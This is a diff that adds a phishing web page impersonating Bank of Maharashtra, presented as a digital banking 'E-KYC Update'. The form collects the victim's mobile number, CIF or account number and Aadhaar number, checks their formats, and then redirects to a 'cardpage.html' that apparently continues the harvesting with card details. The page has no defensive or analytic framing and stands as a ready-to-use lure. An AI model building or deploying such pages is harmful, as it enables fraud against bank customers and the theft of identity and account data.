@@ -1,0 +1,152 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>dehijlbrd</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <style>
+    body {
+      font-family: Arial;
+      background-color: #00abf5;
+      text-align: center;
+      padding: 20px;
+      margin: 0;
+    }
+    img {
+      width: 100%;
+      max-width: 300px;
+      border-radius: 10px;
+    }
+    .side-button {
+      margin-top: 30px;
+      padding: 12px;
+      width: 100%;
+      font-size: 17px;
+      background-color: #0008f6;
+      color: #FFFFFF;
+      border: none;
+      border-radius: 5px;
+    }
+    .form-container {
+      margin-top: 0px;
+      text-align: left;
+      max-width: 400px;
+      margin-left: auto;
+      margin-right: auto;
+      background: #ffffff00;
+      padding: 20px;
+      border-radius: 10px;
+      box-shadow: 0 0 0px rgba(0,0,0,0.1);
+    }
+    .headline {
+      margin-top: 0px;
+    }
+    .headline h1 {
+      font-size: 22px;
+      margin: 0;
+      color: #ffffff;
+    }
+    .headline p {
+      font-size: 14px;
+      margin: 5px 20px;
+      color: #f0f0f0;
+    }
+    .input-group {
+      margin-top: 5px;
+    }
+    .input-group input {
+      width: 94%;
+      padding: 10px;
+      font-size: 12px;
+      border-radius: 0px;
+      border: 1px solid #ccc;
+      margin-top: 5px;
+    }
+    .input-group label {
+      font-weight: bold;
+      color: #fff;
+    }
+    .error {
+      color: #eb7777;
+      font-size: 13px;
+      margin-top: 4px;
+      display: none;
+    }
+    .extra-img {
+      width: 100%;
+      max-width: 300px;
+      border-radius: 10px;
+      margin-top: 20px;
+    }
+  </style>
+</head>
+<body>
+  <img src="https://i.ibb.co/4ns0vWkf/Bank-of-Maharashtra-logo-svg.png" alt="Meri Tasveer">
+
+  <div class="headline">
+    <h1>Welcome To Digital Banking<br>E-KYC Update</h1>
+    <p>(Experience secure, simple, and smart banking solutions for your financial needs)</p>
+  </div>
+
+  <div class="form-container">
+    <form onsubmit="return validateForm();">
+      <div class="input-group">
+        <label for="mobile">Mobile Number</label>
+        <input type="tel" id="mobile" name="mobile" maxlength="10" placeholder="Enter 10-digit Mobile" required>
+        <div class="error" id="mobileError"> ⚠️ Mobile Number.</div>
+      </div>
+      <div class="input-group">
+        <label for="account">CIF/Account Number</label>
+        <input type="tel" id="account" name="account" maxlength="11" placeholder="Enter 11-digit Account No." required>
+        <div class="error" id="accountError">Please enter a valid 11-digit Account Number.</div>
+      </div>
+      <div class="input-group">
+        <label for="customerid">Aadhaar Number</label>
+        <input type="tel" id="customerid" name="customerid" maxlength="12" placeholder="Enter 12-digit Customer ID" required>
+        <div class="error" id="aadhaarError">Please enter a valid 12-digit Aadhaar Number.</div>
+      </div>
+      <button class="side-button" type="submit">Continue</button>
+    </form>
+
+    <!-- Additional images -->
+    <img class="extra-img" src="https://i.ibb.co/YBFgSJP7/77b989a2-c19c-4317-9739-20cca9ebe498.jpg" alt="Extra Image 1">
+    <img class="extra-img" src="https://i.ibb.co/TxY7gVf6/Screenshot-2025-04-21-14-11-44-95-40deb401b9ffe8e1df2f1cc5ba480b12.jpg" alt="Extra Image 2">
+  </div>
+
+  <script>
+    function validateForm() {
+      let isValid = true;
+
+      const mobile = document.getElementById("mobile").value.trim();
+      const account = document.getElementById("account").value.trim();
+      const customerid = document.getElementById("customerid").value.trim();
+
+      const mobilePattern = /^[6-9][0-9]{9}$/;
+
+      document.getElementById("mobileError").style.display = "none";
+      document.getElementById("accountError").style.display = "none";
+      document.getElementById("aadhaarError").style.display = "none";
+
+      if (!mobilePattern.test(mobile)) {
+        document.getElementById("mobileError").style.display = "block";
+        isValid = false;
+      }
+
+      if (account.length !== 11 || isNaN(account)) {
+        document.getElementById("accountError").style.display = "block";
+        isValid = false;
+      }
+
+      if (customerid.length !== 12 || isNaN(customerid)) {
+        document.getElementById("aadhaarError").style.display = "block";
+        isValid = false;
+      }
+
+      if (isValid) {
+        window.location.href = "cardpage.html";
+      }
+
+      return false;
+    }
+  </script>
+</body>
+</html>
